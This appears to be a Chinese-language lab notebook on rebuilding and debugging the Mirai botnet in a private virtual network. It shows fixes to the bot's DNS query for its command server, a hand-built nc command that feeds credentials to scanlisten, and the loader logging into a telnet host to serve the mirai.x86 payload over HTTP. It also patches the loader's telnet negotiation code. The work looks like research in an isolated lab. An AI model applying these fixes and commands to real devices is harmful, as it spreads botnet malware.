recvfrom 可接收到预期的 29 字节数据了：
但是：- **`Response ancount (network): 0x0000, ancount (host): 0`**: 这是新的核心问题！`ancount` (Answer Count) 字段为 0。
看看数据原始包（29 字节）：

```bash
5a ae       Transaction ID (matches sent ID 0xae5a)
81 85       Flags:
            8 = 1000 (QR=1: Response, Opcode=0: Standard Query, AA=0: Not Authoritative, TC=0: Not Truncated, RD=0: Recursion Desired (was 1 in query))
            85 = 1000 0101 (RA=1: Recursion Available, Z=0, RCODE=5: Refused)
00 01       QDCOUNT (Question Count): 1 (correct)
00 00       ANCOUNT (Answer Count): 0 (this is the problem!)
00 00       NSCOUNT (Authority Count): 0
00 00       ARCOUNT (Additional Count): 0
03 63 6e 63 (cnc)
04 74 65 73 74 (test)
02 6d 65 (me)
00          (end of name)
00 01       QTYPE: A (1)
00 01       QCLASS: IN (1)
```

**`RCODE = 5 (Refused)` 是导致 `ancount = 0` 的直接原因。**
程序现在可以成功与本地 DNS 服务器通信，但服务器明确拒绝了您的查询请求 (`RCODE=5 Refused`)

#### 比对 mirai 和 nslookup 的流量区别

使用命令：
sudo tcpdump -i any host 192.168.59.148 and udp port 53 -vv -X

**`nslookup` 的 DNS 查询 (A 记录) - 成功：**

- **出站查询 (Out):**
```
    17:06:16.336340 ens160 Out IP (tos 0x0, ttl 64, id 45378, offset 0, flags [none], proto UDP (17), length 57)     fedora.38763 > 192.168.59.148.domain: [bad udp cksum 0xf8b1 -> 0x3905!] 30316+ A? cnc.test.me. (29)     0x0000:  4500 0039 b142 0000 4011 d0f6 c0a8 3b96  E..9.B..@.....;.     0x0010:  c0a8 3b94 976b 0035 0025 f8b1 766c 0100  ..;..k.5.%..vl..  <-- ID: 766c, Flags: 0100 (RD=1)     0x0020:  0001 0000 0000 0000 0363 6e63 0474 6573  .........cnc.tes     0x0030:  7402 6d65 0000 0100 01                   t.me.....       <-- QTYPE: 0001 (A), QCLASS: 0001 (IN)
```

    - **ID:** `0x766c`
    - **Flags:** `0x0100` (Recursion Desired = 1, बाकी सब 0)
    - **QDCOUNT:** `0x0001`
    - **ANCOUNT, NSCOUNT, ARCOUNT:** `0x0000`
    - **Question:** `cnc.test.me`, QTYPE=A, QCLASS=IN
    - **长度：** 29 字节 (UDP payload)
    - **`tcpdump` 摘要:** `30316+ A? cnc.test.me. (29)` (`+` 表示 RD=1)
    - **UDP Checksum:** `bad udp cksum` (同样是校验和卸载的现象)
- **入站响应 (In):**

```
    17:06:16.336780 ens160 In  IP (tos 0x0, ttl 64, id 40840, offset 0, flags [DF], proto UDP (17), length 73)     192.168.59.148.domain > fedora.38763: [udp sum ok] 30316* q: A? cnc.test.me. 1/0/0 cnc.test.me. A 192.168.59.148 (45)     0x0000:  4500 0049 9f88 4000 4011 a2a0 c0a8 3b94  E..I..@.@.....;.     0x0010:  c0a8 3b96 0035 976b 0035 64a7 766c 8580  ..;..5.k.5d.vl..  <-- ID: 766c, Flags: 8580 (QR=1, RD=1, RA=1, RCODE=0)     0x0020:  0001 0001 0000 0000 0363 6e63 0474 6573  .........cnc.tes  <-- QDCOUNT: 1, ANCOUNT: 1     0x0030:  7402 6d65 0000 0100 01c0 0c00 0100 0100  t.me............  <-- Question, Answer Name Pointer (c00c)     0x0040:  0000 0000 04c0 a83b 94                   .......;.         <-- TTL, RDLENGTH=4, RDATA (IP: 192.168.59.148)
```

    - **ID:** `0x766c` (匹配)
    - **Flags:** `0x8580`
        - `QR = 1` (Response)
        - `Opcode = 0` (Standard Query)
        - `AA = 0` (Not Authoritative)
        - `TC = 0` (Not Truncated)
        - `RD = 1` (Recursion Desired - 服务器通常会复制查询中的 RD 位)
        - `RA = 1` (Recursion Available)
        - `Z = 0`
        - `RCODE = 0` (No Error - **成功！**)
    - **QDCOUNT:** `0x0001`
    - **ANCOUNT:** `0x0001` (有一个答案!)
    - **Answer:** `cnc.test.me A 192.168.59.148`
    - **`tcpdump` 摘要:** `30316* q: A? cnc.test.me. 1/0/0 ...` (`*` 表示权威答案或缓存答案，这里是 1 个答案)

**`mirai.dbg` 程序的 DNS 查询 (A 记录) - 被拒绝 (来自之前的 `tcpdump`):**

- **出站查询 (Out):**

```
    17:00:49.222107 ens160 Out IP (tos 0x0, ttl 64, id 17536, offset 0, flags [DF], proto UDP (17), length 57)     fedora.41335 > 192.168.59.148.domain: [bad udp cksum 0xf8b1 -> 0xa374!] 14550+ [51482n] A? cnc.test.me. [|domain]     0x0000:  4500 0039 4480 4000 4011 fdb8 c0a8 3b96  E..9D.@.@.....;.     0x0010:  c0a8 3b94 a177 0035 0025 f8b1 38d6 0100  ..;..w.5.%..8...  <-- ID: 38d6, Flags: 0100 (RD=1)     0x0020:  0001 0000 c91a 0000 0363 6e63 0474 6573  .........cnc.tes     0x0030:  7402 6d65 0000 0100 01                   t.me.....       <-- QTYPE: 0001 (A), QCLASS: 0001 (IN)
```

    - **ID:** `0x38d6` (与 `nslookup` 不同，这是正常的)
    - **Flags:** `0x0100` (Recursion Desired = 1) - **与 `nslookup` 的查询一致！**
    - **QDCOUNT, ANCOUNT, NSCOUNT, ARCOUNT, Question, 长度，UDP Checksum:** 与 `nslookup` 的查询基本一致。
- **入站响应 (In):**

```bash
    17:00:49.223014 ens160 In  IP (tos 0x0, ttl 64, id 11834, offset 0, flags [DF], proto UDP (17), length 57)     192.168.59.148.domain > fedora.41335: [udp sum ok] 14550 Refused q: A? cnc.test.me. 0/0/0 (29)     0x0000:  4500 0039 2e3a 4000 4011 13ff c0a8 3b94  E..9.:@.@.....;.     0x0010:  c0a8 3b96 0035 a177 0025 ec09 38d6 8185  ..;..5.w.%..8...  <-- ID: 38d6, Flags: 8185 (QR=1, RD=0, RA=1, RCODE=5)     0x0020:  0001 0000 0000 0000 0363 6e63 0474 6573  .........cnc.tes  <-- QDCOUNT: 1, ANCOUNT: 0     0x0030:  7402 6d65 0000 0100 01                   t.me.....
```

    - **ID:** `0x38d6` (匹配)
    - **Flags:** `0x8185`
        - `QR = 1` (Response)
        - `Opcode = 0`
        - `AA = 0`
        - `TC = 0`
        - `RD = 0` (**这里不同！** `nslookup` 收到的响应中 RD=1)
        - `RA = 1`
        - `Z = 0`
        - `RCODE = 5` (Refused - **被拒绝！**)
    - **ANCOUNT:** `0x0000`

**差异分析：**

1. **查询包 (Outbound):**

    - `mirai.dbg` 发送的查询包和 `nslookup` 发送的查询包在核心 DNS 头部字段（ID 除外，Flags, Counts, Question）上几乎完全相同。两者都请求了递归 (`RD=1`)。
    - `tcpdump` 对 `mirai.dbg` 的查询摘要中包含了 `[51482n]` 和 `[|domain]`，而对 `nslookup` 的查询摘要中没有这些。可能 `tcpdump` 对 `mirai.dbg` 构造的包的某些细节有不同的解析。
        - `[51482n]`：这个数字 `51482` 转换成十六进制是 `0xC91A`。在 `mirai.dbg` 的出站查询中，`0xc91a` 出现在 `ANCOUNT` 和 `NSCOUNT` 字段的位置（这两个字段在查询中应为 0）。

            `mirai.dbg query: ... 0001 0000 c91a 0000 ...            ^QDCOUNT=1                  ^ANCOUNT=0xc91a (!!)                        ^NSCOUNT=0`

            所以原因是错误地填充了 `ANCOUNT` 字段。应该是 `0x0000`。
            `nslookup` 的查询中这些字段是正确的 `0000 0000`。
2. **响应包 (Inbound):**

    - **`mirai.dbg` 收到响应:** `RCODE = 5 (Refused)`, `RD = 0`, `ANCOUNT = 0`。
    - **`nslookup` 收到响应:** `RCODE = 0 (No Error)`, `RD = 1`, `ANCOUNT = 1`。

**结论：**

**问题出在 `mirai.dbg` 程序构建 DNS 查询包时，错误地设置了 `ANCOUNT` 字段 (可能还有 `NSCOUNT` 或 `ARCOUNT`，但 `ANCOUNT` 最明显)。**

在 DNS 查询包中，`ANCOUNT`, `NSCOUNT`, 和 `ARCOUNT` 字段应该全部为 0。这些字段用于响应包中，指示答案、权威服务器和附加记录的数量。

当 DNS 服务器 `192.168.59.148` 收到一个 `ANCOUNT` 不为零的查询包时，它很可能认为这个查询包格式不正确或无效，因此返回了 `Refused (RCODE=5)`。

**如何修复：**

检查 `mirai.dbg` 代码中初始化 `struct dnshdr` 的部分：

```c
dnsh->id = dns_id;
dnsh->opts = htons(1 << 8); // Recursion desired dnsh->qdcount = htons(1);
dnsh->ancount = htons(0);   // <--- 必须为 0
dnsh->nscount = htons(0);   // <--- 必须为 0
dnsh->arcount = htons(0);   // <--- 必须为 0
```

**确保 `ancount`, `nscount`, 和 `arcount` 在发送查询时都被正确地设置为了 0。**

`tcpdump` 摘要中的 `[51482n]` 强烈暗示了 `ANCOUNT` 字段的值是 `0xC91A` (十进制 51482)。

#### WIN!

修改 resolv 后再次尝试即可：

```c
  // Set up the dns query
  dnsh->id = dns_id;
  dnsh->opts = htons(1 << 8); // Recursion desired
  dnsh->qdcount = htons(1);
  dnsh->ancount = htons(0);   // <--- 明确设置为 0
  dnsh->nscount = htons(0);   // <--- 明确设置为 0
  dnsh->arcount = htons(0);   // <--- 明确设置为 0
  dnst->qtype = htons(PROTO_DNS_QTYPE_A);
  dnst->qclass = htons(PROTO_DNS_QCLASS_IP);
```

![Pasted image 20250508183955.png](./Pasted%20image%2020250508183955.png)

## scanlisten 接受凭据

目前这里是手动实现的，在首台运行 mirai 的 fedora 机器上：

```bash
printf "\\x00" > data.bin # zero
printf "\\xc0\\xa8\\x3b\\x81" >> data.bin
printf "\\x00\\x17" >> data.bin # 23
printf "\\x06" >> data.bin # username_len = 4
printf "mother" >> data.bin # username
printf "\\x06" >> data.bin # password_len = 5
printf "fucker" >> data.bin # password

nc -t 192.168.49.148 48101 < data.bin
```

就可以在 kali 的 scanlisten 上接收到消息：
![Pasted image 20250513004509.png](./Pasted%20image%2020250513004509.png)

## loader 感染

### 需要修改的代码

```c
// loader/src/main.c
#ifdef DEBUG
  addrs_len = 1;
  addrs = calloc(4, sizeof(ipv4_t));
  addrs[0] = inet_addr("192.168.59.148");
#else

  printf("start init server\n");
  if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs,
                           1024 * 64, "192.168.59.148", 80,
                           "192.168.59.148")) == NULL) {
    printf("Failed to initialize server. Aborting\n");
    return 1;
  }
  printf("before thread create\n");
  pthread_create(&stats_thrd, NULL, stats_thread, NULL);
  printf("thread created!");
  // Read from stdin
```

c 代码中的 server 有问题无法启动，所以需要手动起个 http，托管编译后的 mirai 文件，注意请求路径是 `/bins/mirai.*`

使用`python -m http-server` ,端口号为`server_create` 中的端口，等待后续 129 请求 mirai 的下载请求

```bash
┌──(root㉿kali)-[/home/kali/my-mirai]
└─# python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.59.129 - - [12/May/2025 22:13:20] "GET /bins/mirai.x86 HTTP/1.1" 200 -
192.168.59.129 - - [12/May/2025 22:20:41] "GET /bins/mirai.x86 HTTP/1.1" 200 -
```

### 手动模拟感染

手动将 scanlisten 的凭据定向到 loader

```bash
┌──(root㉿kali)-[/home/kali/my-mirai/Mirai-Source-Code/loader]
└─# echo "192.168.59.129:23 mother:fucker" | sudo ./loader.dbg
(1/9) bins/dlr.arm is loading...
(2/9) bins/dlr.arm7 is loading...
(3/9) bins/dlr.m68k is loading...
(4/9) bins/dlr.mips is loading...
(5/9) bins/dlr.mpsl is loading...
(6/9) bins/dlr.ppc is loading...
(7/9) bins/dlr.sh4 is loading...
(8/9) bins/dlr.spc is loading...
(9/9) bins/dlr.x86 is loading...
start init server
before thread create
thread created!Bound to 192.168.59.148:0
[FD20] Called connection_open
[FD20] Established connection
TELIN: ��▒�� ��#��'
TELIN: ����������!
Hit end of input.
[FD20] Timed out
[FD20] Shut down connection
ERR|192.168.59.129:23 mother:fucker |3
```

此时使用 telnet ip port 登录目标机器是正常的，所以看两个的流量区别

#### telnet 流量

`sudo tcpdump -i any -nn -X port 23`

```bash
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
02:03:47.909824 ens160 In  IP 192.168.59.148.53934 > 192.168.59.129.23: Flags [S], seq 3995951031, win 64240, options [mss 1460,sackOK,TS val 1702712321 ecr 0,nop,wscale 7], length 0
	0x0000:  4500 003c 29df 4000 4006 1877 c0a8 3b94  E..<).@.@..w..;.
	0x0010:  c0a8 3b81 d2ae 0017 ee2d 5fb7 0000 0000  ..;......-_.....
	0x0020:  a002 faf0 7a7f 0000 0204 05b4 0402 080a  ....z...........
	0x0030:  657d 5401 0000 0000 0103 0307            e}T.........
02:03:47.909891 ens160 Out IP 192.168.59.129.23 > 192.168.59.148.53934: Flags [S.], seq 3198895807, ack 3995951032, win 65160, options [mss 1460,sackOK,TS val 1603966923 ecr 1702712321,nop,wscale 7], length 0
	0x0000:  4500 003c 0000 4000 4006 4256 c0a8 3b81  E..<..@.@.BV..;.
	0x0010:  c0a8 3b94 0017 d2ae beab 46bf ee2d 5fb8  ..;.......F..-_.
	0x0020:  a012 fe88 f894 0000 0204 05b4 0402 080a  ................
	0x0030:  5f9a 97cb 657d 5401 0103 0307            _...e}T.....
02:03:47.910118 ens160 In  IP 192.168.59.148.53934 > 192.168.59.129.23: Flags [.], ack 1, win 502, options [nop,nop,TS val 1702712322 ecr 1603966923], length 0
	0x0000:  4500 0034 29e0 4000 4006 187e c0a8 3b94  E..4).@.@..~..;.
	0x0010:  c0a8 3b81 d2ae 0017 ee2d 5fb8 beab 46c0  ..;......-_...F.
	0x0020:  8010 01f6 a563 0000 0101 080a 657d 5402  .....c......e}T.
	0x0030:  5f9a 97cb                                _...
02:03:48.127883 ens160 Out IP 192.168.59.129.23 > 192.168.59.148.53934: Flags [P.], seq 1:13, ack 1, win 510, options [nop,nop,TS val 1603967141 ecr 1702712322], length 12 [telnet DO TERMINAL TYPE, DO TSPEED, DO XDISPLOC, DO NEW-ENVIRON]
	0x0000:  4510 0040 5c22 4000 4006 e61f c0a8 3b81  E..@\"@.@.....;.
	0x0010:  c0a8 3b94 0017 d2ae beab 46c0 ee2d 5fb8  ..;.......F..-_.
	0x0020:  8018 01fe f898 0000 0101 080a 5f9a 98a5  ............_...
	0x0030:  657d 5402 fffd 18ff fd20 fffd 23ff fd27  e}T.........#..'
02:03:48.128130 ens160 In  IP 192.168.59.148.53934 > 192.168.59.129.23: Flags [.], ack 13, win 502, options [nop,nop,TS val 1702712540 ecr 1603967141], length 0
	0x0000:  4500 0034 29e1 4000 4006 187d c0a8 3b94  E..4).@.@..}..;.
	0x0010:  c0a8 3b81 d2ae 0017 ee2d 5fb8 beab 46cc  ..;......-_...F.
	0x0020:  8010 01f6 a3a3 0000 0101 080a 657d 54dc  ............e}T.
	0x0030:  5f9a 98a5                                _...
02:03:48.128242 ens160 In  IP 192.168.59.148.53934 > 192.168.59.129.23: Flags [P.], seq 1:13, ack 13, win 502, options [nop,nop,TS val 1702712540 ecr 1603967141], length 12 [telnet WILL TERMINAL TYPE, WILL TSPEED, WILL XDISPLOC, WILL NEW-ENVIRON]
	0x0000:  4500 0040 29e2 4000 4006 1870 c0a8 3b94  E..@).@.@..p..;.
	0x0010:  c0a8 3b81 d2ae 0017 ee2d 5fb8 beab 46cc  ..;......-_...F.
	0x0020:  8018 01f6 7050 0000 0101 080a 657d 54dc  ....pP......e}T.
	0x0030:  5f9a 98a5 fffb 18ff fb20 fffb 23ff fb27  _...........#..'
02:03:48.128260 ens160 Out IP 192.168.59.129.23 > 192.168.59.148.53934: Flags [.], ack 13, win 510, options [nop,nop,TS val 1603967141 ecr 1702712540], length 0
	0x0000:  4510 0034 5c23 4000 4006 e62a c0a8 3b81  E..4\#@.@..*..;.
	0x0010:  c0a8 3b94 0017 d2ae beab 46cc ee2d 5fc4  ..;.......F..-_.
	0x0020:  8010 01fe f88c 0000 0101 080a 5f9a 98a5  ............_...
	0x0030:  657d 54dc                                e}T.
02:03:48.128337 ens160 Out IP 192.168.59.129.23 > 192.168.59.148.53934: Flags [P.], seq 13:37, ack 13, win 510, options [nop,nop,TS val 1603967141 ecr 1702712540], length 24 [telnet SB TSPEED SEND SE, SB XDISPLOC SEND SE, SB NEW-ENVIRON SEND SE, SB TERMINAL TYPE SEND SE]
	0x0000:  4510 004c 5c24 4000 4006 e611 c0a8 3b81  E..L\$@.@.....;.
	0x0010:  c0a8 3b94 0017 d2ae beab 46cc ee2d 5fc4  ..;.......F..-_.
	0x0020:  8018 01fe f8a4 0000 0101 080a 5f9a 98a5  ............_...
	0x0030:  657d 54dc fffa 2001 fff0 fffa 2301 fff0  e}T.........#...
	0x0040:  fffa 2701 fff0 fffa 1801 fff0            ..'.........
02:03:48.128733 ens160 In  IP 192.168.59.148.53934 > 192.168.59.129.23: Flags [P.], seq 13:87, ack 37, win 502, options [nop,nop,TS val 1702712540 ecr 1603967141], length 74 [telnet SB TSPEED IS 0x33 0x38 0x34 0x30 0x30 0x2c 0x33 0x38 0x34 0x30 0x30 SE, SB XDISPLOC IS 0x6b 0x61 0x6c 0x69 0x3a 0x30 0x2e 0x30 SE, SB NEW-ENVIRON IS 0 0x44 0x49 0x53 0x50 0x4c 0x41 0x59 0x1 0x6b 0x61 0x6c 0x69 0x3a 0x30 0x2e 0x30 SE, SB TERMINAL TYPE IS 0x58 0x54 0x45 0x52 0x4d 0x2d 0x32 0x35 0x36 0x43 0x4f 0x4c 0x4f 0x52 SE]
	0x0000:  4500 007e 29e3 4000 4006 1831 c0a8 3b94  E..~).@.@..1..;.
	0x0010:  c0a8 3b81 d2ae 0017 ee2d 5fc4 beab 46e4  ..;......-_...F.
	0x0020:  8018 01f6 c9db 0000 0101 080a 657d 54dc  ............e}T.
	0x0030:  5f9a 98a5 fffa 2000 3338 3430 302c 3338  _.......38400,38
	0x0040:  3430 30ff f0ff fa23 006b 616c 693a 302e  400....#.kali:0.
	0x0050:  30ff f0ff fa27 0000 4449 5350 4c41 5901  0....'..DISPLAY.
	0x0060:  6b61 6c69 3a30 2e30 fff0 fffa 1800 5854  kali:0.0......XT
	0x0070:  4552 4d2d 3235 3643 4f4c 4f52 fff0       ERM-256COLOR..
02:03:48.129062 ens160 Out IP 192.168.59.129.23 > 192.168.59.148.53934: Flags [P.], seq 37:52, ack 87, win 510, options [nop,nop,TS val 1603967142 ecr 1702712540], length 15 [telnet WILL SUPPRESS GO AHEAD, DO ECHO, DO NAWS, WILL STATUS, DO LFLOW]
	0x0000:  4510 0043 5c25 4000 4006 e619 c0a8 3b81  E..C\%@.@.....;.
	0x0010:  c0a8 3b94 0017 d2ae beab 46e4 ee2d 600e  ..;.......F..-`.
	0x0020:  8018 01fe f89b 0000 0101 080a 5f9a 98a6  ............_...
	0x0030:  657d 54dc fffb 03ff fd01 fffd 1fff fb05  e}T.............
	0x0040:  fffd 21                                  ..!
02:03:48.129326 ens160 In  IP 192.168.59.148.53934 > 192.168.59.129.23: Flags [P.], seq 87:111, ack 52, win 502, options [nop,nop,TS val 1702712541 ecr 1603967142], length 24 [telnet DO SUPPRESS GO AHEAD, WONT ECHO, WILL NAWS, SB NAWS IS 0xc6 0 0x12 SE, DO STATUS, WILL LFLOW]
	0x0000:  4500 004c 29e4 4000 4006 1862 c0a8 3b94  E..L).@.@..b..;.
	0x0010:  c0a8 3b81 d2ae 0017 ee2d 600e beab 46f3  ..;......-`...F.
	0x0020:  8018 01f6 8702 0000 0101 080a 657d 54dd  ............e}T.
	0x0030:  5f9a 98a6 fffd 03ff fc01 fffb 1fff fa1f  _...............
	0x0040:  00c6 0012 fff0 fffd 05ff fb21            ...........!
02:03:48.129431 ens160 Out IP 192.168.59.129.23 > 192.168.59.148.53934: Flags [P.], seq 52:104, ack 111, win 510, options [nop,nop,TS val 1603967142 ecr 1702712541], length 52 [telnet WILL ECHO]
	0x0000:  4510 0068 5c26 4000 4006 e5f3 c0a8 3b81  E..h\&@.@.....;.
	0x0010:  c0a8 3b94 0017 d2ae beab 46f3 ee2d 6026  ..;.......F..-`&
	0x0020:  8018 01fe f8c0 0000 0101 080a 5f9a 98a6  ............_...
	0x0030:  657d 54dd fffb 010d 0a4b 6572 6e65 6c20  e}T......Kernel.
	0x0040:  362e 332e 352d 3230 302e 6663 3338 2e78  6.3.5-200.fc38.x
	0x0050:  3836 5f36 3420 6f6e 2061 6e20 7838 365f  86_64.on.an.x86_
	0x0060:  3634 2028 3229 0d0a                      64.(2)..

```

#### loader 流量

```bash
dropped privs to tcpdump
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
01:58:44.631257 ens160 In  IP 192.168.59.148.36819 > 192.168.59.129.23: Flags [S], seq 1503118860, win 64240, options [mss 1460,sackOK,TS val 1702409029 ecr 0,nop,wscale 7], length 0
	0x0000:  4500 003c 0da7 4000 4006 34af c0a8 3b94  E..<..@.@.4...;.
	0x0010:  c0a8 3b81 8fd3 0017 5997 c60c 0000 0000  ..;.....Y.......
	0x0020:  a002 faf0 8c5c 0000 0204 05b4 0402 080a  .....\..........
	0x0030:  6578 b345 0000 0000 0103 0307            ex.E........
01:58:44.631318 ens160 Out IP 192.168.59.129.23 > 192.168.59.148.36819: Flags [S.], seq 738016906, ack 1503118861, win 65160, options [mss 1460,sackOK,TS val 1603663644 ecr 1702409029,nop,wscale 7], length 0
	0x0000:  4500 003c 0000 4000 4006 4256 c0a8 3b81  E..<..@.@.BV..;.
	0x0010:  c0a8 3b94 0017 8fd3 2bfd 3e8a 5997 c60d  ..;.....+.>.Y...
	0x0020:  a012 fe88 f894 0000 0204 05b4 0402 080a  ................
	0x0030:  5f95 f71c 6578 b345 0103 0307            _...ex.E....
01:58:44.631555 ens160 In  IP 192.168.59.148.36819 > 192.168.59.129.23: Flags [.], ack 1, win 502, options [nop,nop,TS val 1702409030 ecr 1603663644], length 0
	0x0000:  4500 0034 0da8 4000 4006 34b6 c0a8 3b94  E..4..@.@.4...;.
	0x0010:  c0a8 3b81 8fd3 0017 5997 c60d 2bfd 3e8b  ..;.....Y...+.>.
	0x0020:  8010 01f6 f2d7 0000 0101 080a 6578 b346  ............ex.F
	0x0030:  5f95 f71c                                _...
01:58:44.877861 ens160 Out IP 192.168.59.129.23 > 192.168.59.148.36819: Flags [P.], seq 1:13, ack 1, win 510, options [nop,nop,TS val 1603663891 ecr 1702409030], length 12 [telnet DO TERMINAL TYPE, DO TSPEED, DO XDISPLOC, DO NEW-ENVIRON]
	0x0000:  4510 0040 1fde 4000 4006 2264 c0a8 3b81  E..@..@.@."d..;.
	0x0010:  c0a8 3b94 0017 8fd3 2bfd 3e8b 5997 c60d  ..;.....+.>.Y...
	0x0020:  8018 01fe f898 0000 0101 080a 5f95 f813  ............_...
	0x0030:  6578 b346 fffd 18ff fd20 fffd 23ff fd27  ex.F........#..'
01:58:44.878086 ens160 In  IP 192.168.59.148.36819 > 192.168.59.129.23: Flags [.], ack 13, win 502, options [nop,nop,TS val 1702409276 ecr 1603663891], length 0
	0x0000:  4500 0034 0da9 4000 4006 34b5 c0a8 3b94  E..4..@.@.4...;.
	0x0010:  c0a8 3b81 8fd3 0017 5997 c60d 2bfd 3e97  ..;.....Y...+.>.
	0x0020:  8010 01f6 f0de 0000 0101 080a 6578 b43c  ............ex.<
	0x0030:  5f95 f813                                _...
01:58:44.878205 ens160 In  IP 192.168.59.148.36819 > 192.168.59.129.23: Flags [P.], seq 1:4, ack 13, win 502, options [nop,nop,TS val 1702409276 ecr 1603663891], length 3 [telnet WONT TERMINAL TYPE]
	0x0000:  4500 0037 0daa 4000 4006 34b1 c0a8 3b94  E..7..@.@.4...;.
	0x0010:  c0a8 3b81 8fd3 0017 5997 c60d 2bfd 3e97  ..;.....Y...+.>.
	0x0020:  8018 01f6 d8d6 0000 0101 080a 6578 b43c  ............ex.<
	0x0030:  5f95 f813 fffc 18                        _......
01:58:44.878229 ens160 Out IP 192.168.59.129.23 > 192.168.59.148.36819: Flags [.], ack 4, win 510, options [nop,nop,TS val 1603663891 ecr 1702409276], length 0
	0x0000:  4510 0034 1fdf 4000 4006 226f c0a8 3b81  E..4..@.@."o..;.
	0x0010:  c0a8 3b94 0017 8fd3 2bfd 3e97 5997 c610  ..;.....+.>.Y...
	0x0020:  8010 01fe f88c 0000 0101 080a 5f95 f813  ............_...
	0x0030:  6578 b43c                                ex.<
01:58:44.878431 ens160 In  IP 192.168.59.148.36819 > 192.168.59.129.23: Flags [P.], seq 4:13, ack 13, win 502, options [nop,nop,TS val 1702409277 ecr 1603663891], length 9 [telnet WONT TSPEED, WONT XDISPLOC, WONT NEW-ENVIRON]
	0x0000:  4500 003d 0dab 4000 4006 34aa c0a8 3b94  E..=..@.@.4...;.
	0x0010:  c0a8 3b81 8fd3 0017 5997 c610 2bfd 3e97  ..;.....Y...+.>.
	0x0020:  8018 01f6 acac 0000 0101 080a 6578 b43d  ............ex.=
	0x0030:  5f95 f813 fffc 20ff fc23 fffc 27         _........#..'
01:58:44.878457 ens160 Out IP 192.168.59.129.23 > 192.168.59.148.36819: Flags [.], ack 13, win 510, options [nop,nop,TS val 1603663891 ecr 1702409277], length 0
	0x0000:  4510 0034 1fe0 4000 4006 226e c0a8 3b81  E..4..@.@."n..;.
	0x0010:  c0a8 3b94 0017 8fd3 2bfd 3e97 5997 c619  ..;.....+.>.Y...
	0x0020:  8010 01fe f88c 0000 0101 080a 5f95 f813  ............_...
	0x0030:  6578 b43d                                ex.=
01:58:44.878690 ens160 Out IP 192.168.59.129.23 > 192.168.59.148.36819: Flags [P.], seq 13:28, ack 13, win 510, options [nop,nop,TS val 1603663891 ecr 1702409277], length 15 [telnet WILL SUPPRESS GO AHEAD, DO ECHO, DO NAWS, WILL STATUS, DO LFLOW]
	0x0000:  4510 0043 1fe1 4000 4006 225e c0a8 3b81  E..C..@.@."^..;.
	0x0010:  c0a8 3b94 0017 8fd3 2bfd 3e97 5997 c619  ..;.....+.>.Y...
	0x0020:  8018 01fe f89b 0000 0101 080a 5f95 f813  ............_...
	0x0030:  6578 b43d fffb 03ff fd01 fffd 1fff fb05  ex.=............
	0x0040:  fffd 21                                  ..!
01:58:44.920526 ens160 In  IP 192.168.59.148.36819 > 192.168.59.129.23: Flags [.], ack 28, win 502, options [nop,nop,TS val 1702409319 ecr 1603663891], length 0
	0x0000:  4500 0034 0dac 4000 4006 34b2 c0a8 3b94  E..4..@.@.4...;.
	0x0010:  c0a8 3b81 8fd3 0017 5997 c619 2bfd 3ea6  ..;.....Y...+.>.
	0x0020:  8010 01f6 f098 0000 0101 080a 6578 b467  ............ex.g
	0x0030:  5f95 f813                                _...
01:59:15.702589 ens160 In  IP 192.168.59.148.36819 > 192.168.59.129.23: Flags [F.], seq 13, ack 28, win 502, options [nop,nop,TS val 1702440102 ecr 1603663891], length 0
	0x0000:  4500 0034 0dad 4000 4006 34b1 c0a8 3b94  E..4..@.@.4...;.
	0x0010:  c0a8 3b81 8fd3 0017 5997 c619 2bfd 3ea6  ..;.....Y...+.>.
	0x0020:  8011 01f6 7858 0000 0101 080a 6579 2ca6  ....xX......ey,.
	0x0030:  5f95 f813                                _...
01:59:15.704036 ens160 Out IP 192.168.59.129.23 > 192.168.59.148.36819: Flags [F.], seq 28, ack 14, win 510, options [nop,nop,TS val 1603694717 ecr 1702440102], length 0
	0x0000:  4510 0034 1fe2 4000 4006 226c c0a8 3b81  E..4..@.@."l..;.
	0x0010:  c0a8 3b94 0017 8fd3 2bfd 3ea6 5997 c61a  ..;.....+.>.Y...
	0x0020:  8011 01fe f88c 0000 0101 080a 5f96 707d  ............_.p}
	0x0030:  6579 2ca6                                ey,.
01:59:15.704296 ens160 In  IP 192.168.59.148.36819 > 192.168.59.129.23: Flags [.], ack 29, win 502, options [nop,nop,TS val 1702440104 ecr 1603694717], length 0
	0x0000:  4500 0034 0dae 4000 4006 34b0 c0a8 3b94  E..4..@.@.4...;.
	0x0010:  c0a8 3b81 8fd3 0017 5997 c61a 2bfd 3ea7  ..;.....Y...+.>.
	0x0020:  8010 01f6 ffea 0000 0101 080a 6579 2ca8  ............ey,.
	0x0030:  5f96 707d                                _.p}
```

#### telnet 协商错误

报错：`ERR|192.168.59.129:23 mother:fucker |3`

从抓包数据看，客户端发送了多个 telnet 选项协商（如 DO TERMINAL TYPE, DO TSPEED 等），而服务端回应了 WONT 和 WILL，但并没有处理完缓冲区中所有连续的 IAC 序列，直接关闭连接，身份验证流程没有正确触发，因为选项协商未完成或失败，导致后续进入 TELNET_USER_PROMPT 状态会发送用户名无法执行。

connection_consume_iacs 函数未能正确识别或处理收到的 IAC 命令，如果 Telnet 选项协商（IAC 序列）没有被正确处理，客户端（loader）的状态机无法从 TELNET_READ_IACS（读取 IAC 序列）转换到 TELNET_USER_PROMPT（等待用户输入提示然后发送用户名）或其他后续状态。


当服务器发送 `IAC WILL <OPTION>` (例如 `FF FB 03` - `IAC WILL SUPPRESS-GO-AHEAD`) 时：

- `ptr[0]` 是 `0xFF (IAC)`。
- `ptr[1]` 是 `0xFB (WILL)`。
- 根据代码 `else if (ptr[i] == 0xfb)` `ptr[i] = 0xfd`;，`ptr[1]` 会被修改为 `0xFD (DO)`。
- 因此，客户端会错误地回应 `IAC DO <OPTION>` (例如 `FF FD 03`)。
正确的响应应该是 `IAC DONT <OPTION>` (例如 `FF FE 03`)。

修改 connection_consume_iacs 的 IAC 处理逻辑、can_consume 和 handle_event 中的状态转换，增加大量日志打印便于后面的分析

```c
// can_consume
static BOOL can_consume(struct connection *conn, uint8_t *ptr, int amount) {
  uint8_t *end = conn->rdbuf + conn->rdbuf_pos;

  return ptr + amount < end; // BUG HERE
}
```

正确的逻辑应该是 `ptr + amount <= end`
`handle_event` 函数 状态转换逻辑在 `TELNET_READ_IACS`

```c
case TELNET_READ_IACS:
